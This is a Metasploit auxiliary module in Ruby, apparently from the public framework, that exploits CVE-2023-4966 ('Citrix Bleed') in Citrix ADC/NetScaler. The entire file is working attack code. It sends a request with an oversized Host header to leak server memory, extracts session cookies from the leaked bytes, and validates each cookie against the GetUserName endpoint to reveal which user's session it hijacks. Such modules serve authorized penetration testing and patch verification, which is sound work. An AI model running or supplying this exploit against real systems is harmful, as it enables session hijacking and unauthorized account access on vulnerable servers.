##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  COOKIE_NAME = 'NSC_AAAC'.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Citrix ADC (NetScaler) Bleed Scanner',
        'Description' => %q{
          This module scans for a vulnerability that allows a remote, unauthenticated attacker to leak memory for a
          target Citrix ADC server. The leaked memory is then scanned for session cookies which can be hijacked if found.
        },
        'Author' => [
          'Dylan Pindur', # original assetnote writeup
          'Spencer McIntyre' # metasploit module
        ],
        'References' => [
          ['CVE', '2023-4966'],
          ['URL', 'https://www.assetnote.io/resources/research/citrix-bleed-leaking-session-tokens-with-cve-2023-4966']
        ],
        'DisclosureDate' => '2023-10-25',
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => [],
          'AKA' => ['Citrix Bleed']
        },
        'DefaultOptions' => { 'RPORT' => 443, 'SSL' => true }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/'])
    ])
  end

  def get_user_for_cookie(cookie)
    vprint_status("#{peer} - Checking cookie: #{cookie}")
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'logon/LogonPoint/Authentication/GetUserName'),
      'headers' => {
        'Cookie' => "#{COOKIE_NAME}=#{cookie}"
      }
    )
    return nil unless res&.code == 200

    res.body.strip
  end

  def run_host(_target_host)
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'oauth/idp/.well-known/openid-configuration'),
      'headers' => {
        'Host' => Rex::Text.rand_text_alpha(24812),
        'Connection' => 'close'
      }
    )
    return nil unless res&.code == 200
    return nil unless res.headers['Content-Type'].present?
    return nil unless res.headers['Content-Type'].downcase.start_with?('application/json')

    username = nil
    res.body.scan(/([0-9a-f]{32,65})/i).each do |cookie|
      cookie = cookie.first
      username = get_user_for_cookie(cookie)
      next unless username

      print_good("#{peer} - Cookie: #{COOKIE_NAME}=#{cookie} Username: #{username}")
      report_vuln
    end

    return if username

    begin
      JSON.parse(res.body)
    rescue JSON::ParserError
      print_status("#{peer} - The target is vulnerable but no valid cookies were leaked.")
      report_vuln
    else
      print_status("#{peer} - The target does not appear vulnerable.")
    end
  end

  def report_vuln
    super(
      host: rhost,
      port: rport,
      name: name,
      refs: references
    )
  end
end
